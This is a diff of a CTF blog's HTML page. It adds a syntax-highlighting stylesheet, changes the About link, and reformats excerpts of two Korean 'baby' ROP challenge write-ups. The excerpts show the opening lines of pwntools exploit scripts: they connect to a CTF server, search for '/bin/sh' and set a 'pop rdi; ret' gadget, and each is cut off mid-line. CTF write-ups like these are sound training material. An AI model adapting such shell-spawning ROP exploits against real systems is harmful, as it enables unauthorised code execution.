@@ -59,7 +59,7 @@
     
 
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 </html>
 <body>
     <div id="wrap">
@@ -85,7 +85,7 @@
                                         <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Daily/">Daily</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Theory/">Theory</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/">WriteUps</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Crypto/">Crypto</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Foren/">Foren</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Misc/">Misc</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Pwn/">Pwn</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Script/">Script</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Web/">Web</a></li></ul></li></ul>
                                     
                                 <li class="main-nav-list-item">
-                                    <a class="main-nav-list-link" href="https://about.me/j0n9hyun">About</a>
+                                    <a class="main-nav-list-link" href="/about">About</a>
                                 </li>
                             
                         </ul>
@@ -262,7 +262,12 @@ a에 300,
 기본 ROP 문제
 바이너리
 우분투 18.04 환경에서는  main으로 안 돌아가는 경우도 있는 것 같다. [1]  (일단 난 잘됨) 
-12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *#r = process('./baby2')r = rem
+from pwn import *
+
+#r = process('./baby2')
+r = remote('baby-01.pwn.beer', 10002)
+e = ELF('./baby2')
+libc = ELF('./libc
         </p>
     </div>
 </article>
@@ -290,7 +295,14 @@ a에 300,
 
         <p class="article-excerpt">
              Baby2
-12345678910111213141516171819from pwn import *#r = process('./baby1')r = remote('baby-01.pwn.beer', 10001)e = ELF('./baby1')binsh = e.search("/bin/sh").next()pr = 0x0000000000400793 # pop rdi; 
+from pwn import *
+#r = process('./baby1')
+r = remote('baby-01.pwn.beer', 10001)
+e = ELF('./baby1')
+binsh = e.search("/bin/sh").next()
+pr = 0x0000000000400793 # pop rdi; ret 
+
+ru = lambda a: r.r
         </p>
     </div>
 </article>
@@ -380,6 +392,8 @@ a에 300,
     </div>
 
 
+            
+                
             
                 
     <div class="widget-wrap widget-list">
